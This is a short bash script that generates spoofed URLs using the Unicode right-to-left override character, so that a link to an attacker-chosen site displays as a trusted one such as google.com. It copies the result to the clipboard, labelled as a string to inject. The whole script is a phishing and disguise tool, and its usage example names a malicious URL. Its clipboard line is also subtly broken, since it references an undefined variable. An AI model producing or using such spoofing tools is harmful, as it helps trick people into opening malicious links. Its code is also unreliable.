#!/bin/bash

if ! command -v xclip &> /dev/null; then
    echo "xclip could not be found. Please install xclip."
    exit 1
fi

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <actual_url> <fake_url>"
    echo "Example: ./rtlo.sh 'https://your.pro.malicious.url.com' 'https://google.com/'"
    exit 1
fi

actual_url="$1"
fake_url=$(echo "$2" | rev)

actual_url_reversed=$(echo "$1" | rev)

RTLO=$(echo -e "\u202E")

echo -e "${RTLO}${actual_url}${fake_url} <--- [Inject this] [Copied to Clipboard]"
echo -e "\e[2m${2}${actual_url_reversed}\e[0m <--- [Fake looking URL]"
echo -n "${RTLO}${malicious}${fake_url}" | xclip -selection clipboard
